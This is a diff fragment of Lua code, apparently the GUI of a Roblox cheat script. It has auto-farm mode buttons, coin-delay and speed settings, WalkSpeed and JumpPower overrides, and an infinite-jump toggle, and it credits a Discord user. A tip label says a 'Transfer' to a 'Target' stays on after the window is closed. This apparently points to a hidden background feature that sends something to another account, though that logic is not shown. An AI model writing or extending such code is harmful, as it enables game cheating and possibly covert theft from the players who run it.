+    b.LayoutOrder = 20 + i
+    b.Parent = content
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 5)
+    b.MouseButton1Click:Connect(function()
+        FARM_MODE = name
+        farmLbl.Text = "Farm Mode: " .. FARM_MODE
+        for _, c in ipairs(content:GetChildren()) do
+            if c:IsA("TextButton") and string.sub(c.Name, 1, 3) == "FM_" then
+                c.BackgroundColor3 = (c.Name == "FM_" .. name) and Color3.fromRGB(190, 85, 25) or Color3.fromRGB(40, 18, 10)
+            end
+        end
+    end)
+end
+
+local function mkBox(label, value, order, apply)
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, -12, 0, 16)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = label .. ": " .. tostring(value)
+    lbl.TextColor3 = Color3.fromRGB(230, 180, 120)
+    lbl.Font = Enum.Font.Gotham
+    lbl.TextSize = 12
+    lbl.LayoutOrder = order
+    lbl.Parent = content
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(1, -12, 0, 28)
+    box.BackgroundColor3 = Color3.fromRGB(32, 14, 6)
+    box.Text = tostring(value)
+    box.TextColor3 = Color3.new(1, 1, 1)
+    box.Font = Enum.Font.GothamBold
+    box.TextSize = 13
+    box.LayoutOrder = order + 1
+    box.ClearTextOnFocus = false
+    box.Parent = content
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 5)
+    local function commit()
+        local n = tonumber(box.Text)
+        if n then apply(n, lbl, box) end
+    end
+    box.FocusLost:Connect(function()
+        commit()
+    end)
+    box:GetPropertyChangedSignal("Text"):Connect(function()
+        local n = tonumber(box.Text)
+        if n then apply(n, lbl, box) end
+    end)
+    return box
+end
+
+mkBox("Speed", SP, 8, function(n, lbl, box)
+    SP = math.clamp(n, 1, 50)
+    lbl.Text = "Speed: " .. SP
+end)
+
+mkBox("Coin Delay", COIN_DELAY, 10, function(n, lbl, box)
+    COIN_DELAY = math.clamp(n, 0.05, 5)
+    lbl.Text = "Coin Delay: " .. COIN_DELAY
+end)
+
+local moveHdr = Instance.new("TextLabel")
+moveHdr.Size = UDim2.new(1, -12, 0, 18)
+moveHdr.BackgroundTransparency = 1
+moveHdr.Text = "-- Movement --"
+moveHdr.TextColor3 = Color3.fromRGB(255, 160, 80)
+moveHdr.Font = Enum.Font.GothamBold
+moveHdr.TextSize = 12
+moveHdr.LayoutOrder = 12
+moveHdr.Parent = content
+
+mkBox("WalkSpeed", WS_SPD, 13, function(n, lbl, box)
+    WS_SPD = math.clamp(n, 1, 200)
+    box.Text = tostring(WS_SPD)
+    lbl.Text = "WalkSpeed: " .. WS_SPD
+    applyMoveStats()
+end)
+
+mkBox("JumpPower", JP, 15, function(n, lbl, box)
+    JP = math.clamp(n, 1, 300)
+    box.Text = tostring(JP)
+    lbl.Text = "JumpPower: " .. JP
+    applyMoveStats()
+end)
+
+mkToggle("Inf Jump", IJ, function(v) IJ = v end, 17)
+
+local tip = Instance.new("TextLabel")
+tip.Size = UDim2.new(1, -12, 0, 36)
+tip.BackgroundTransparency = 1
+tip.Text = "Transfer stays on after X\nTarget: " .. TARGET .. " | check every 3s"
+tip.TextColor3 = Color3.fromRGB(180, 160, 140)
+tip.Font = Enum.Font.Gotham
+tip.TextSize = 11
+tip.TextYAlignment = Enum.TextYAlignment.Top
+tip.LayoutOrder = 18
+tip.Parent = content
+
+local credits = Instance.new("TextLabel")
+credits.Size = UDim2.new(1, -12, 0, 22)
+credits.BackgroundTransparency = 1
+credits.Text = "credits to no7kh in discord"
+credits.TextColor3 = Color3.fromRGB(140, 120, 100)
+credits.Font = Enum.Font.Gotham
+credits.TextSize = 11
+credits.LayoutOrder = 99
+credits.Parent = content
+
